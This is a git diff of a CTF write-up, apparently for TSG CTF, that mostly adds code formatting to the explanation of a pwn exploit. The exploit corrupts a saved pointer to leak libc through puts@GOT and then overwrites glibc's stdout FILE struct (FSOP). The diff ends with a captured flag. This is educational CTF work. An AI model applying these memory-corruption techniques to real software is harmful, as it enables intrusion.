@@ -386,7 +386,7 @@ confirming our logic above:
 12d7: mov %rax,-0x328(%rbp)     # save buf pointer
 ```
 
-and when we resume notepad using setjmp != 0, we do ```printf("%s", buf)```
+and when we resume notepad using ```setjmp != 0```, we do ```printf("%s", buf)```
 
 ```asm
 12f6: call _setjmp@plt          # env[1] 
@@ -397,8 +397,7 @@ and when we resume notepad using setjmp != 0, we do ```printf("%s", buf)```
 1318: call printf@plt
 ```
 
-so if we corrupt this pointer at ```rbp-0x328```, we can get an arbitrary read via ```%s```
-and our foreshadow arbitrary write looks like this:
+so if we corrupt this pointer at ```rbp-0x328```, we can get an arbitrary read via ```%s```, and our foreshadowed arbitrary write looks like this:
 
 ```asm
 136a: mov -0x328(%rbp),%rax     # buf pointer
@@ -422,13 +421,16 @@ io.recvuntil(b'saved content: ')
 libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
 ```
 
-we write only the low 32 bits of the desired pointer, which is the puts@GOT address. the high bits of the notepad buf pointer were originally a heap pointer like 0x00005555........ and PIE mappings are also typically 0x00005555........ locally/remote. so changing only the low dword often retargets the pointer from heap to PIE region. thats why we use & 0xffffffff. 
+we write only the low 32 bits of the desired pointer, which is the ```puts@GOT``` address. the high bits of the notepad buf pointer were originally a heap pointer like ```0x00005555........``` and PIE mappings are also typically ```0x00005555........``` locally/remote. so changing only the low dword often retargets the pointer from heap to PIE region. thats why we use ```& 0xffffffff```. 
 
-notepad resumes = printf("%s", buf) reads bytes at puts@GOT = GOT holds the resolved libc address of puts = subtract libc.sym.puts and we get libc base.
+1. notepad resumes 
+2. ```printf("%s", buf)``` reads bytes at ```puts@GOT```
+3. GOT holds the resolved libc address of puts 
+4. subtract ```libc.sym.puts``` and we get libc base
 
 ### FSOP
 
-now we want notepad, so the fgets, to write into libc stdout FILE object, which is at 0x7f........, not 0x00005555........, so we overwrite both halves
+now we want notepad, so the ```fgets```, to write into libc stdout ```FILE``` object, which is at ```0x7f........```, not ```0x00005555........```, so we overwrite both halves
 
 ```
 translator((_IO_2_1_stdout_ >> 32) & 0xffffffff) 
@@ -441,11 +443,11 @@ after these two shuffles, notepad saved pointer becomes:
 buf == libc.sym._IO_2_1_stdout_
 ```
 
-so the fgets of notepad becomes a write directly into libc global stdout struct, which is exactly FSOP.
+so the ```fgets``` of notepad becomes a write directly into libc global stdout struct, which is exactly ```FSOP```.
 
 ### brain freeze
 
-Right. FSOP. But... wasnt that patched in like glibc ≥2.24/2.27? Checking the version of the handout libc shows:
+right. FSOP. but... wasnt that patched in like glibc ≥2.24/2.27? Checking the version of the handout libc shows:
 
 ```shell
 tlsbollei@tlsbollei mnt/.../tsg-land strings libc.so.6 | grep "GNU C Library"
@@ -481,7 +483,7 @@ notepad local pointer is stored at rbp-0x328 and used as the destination for fge
 1379: call   fgets@plt               ; fgets(buf, 0x1000, stdin)
 ```
 
-once the exploit corrupts that saved buf pointer to equal libc:_IO_2_1_stdout_, the line:
+once the exploit corrupts that saved buf pointer to equal ```libc:_IO_2_1_stdout_```, the line:
 
 ```python
 io.sendlineafter(b' > ', fs)
@@ -1675,6 +1677,7 @@ if expression is a3[15] - N → idx = 64 - N
 if expression is a3[15] + N → idx = 64 + N
 ```
 reconstructing all gives us the flag, ```TSGCTF{Inv3571ga710n_1n70_BOF_Or13n73d_Pr0gramm1ng_a5_a_73chn1qu3_f0r_0bfu5ca710n}```
+
 
 
 
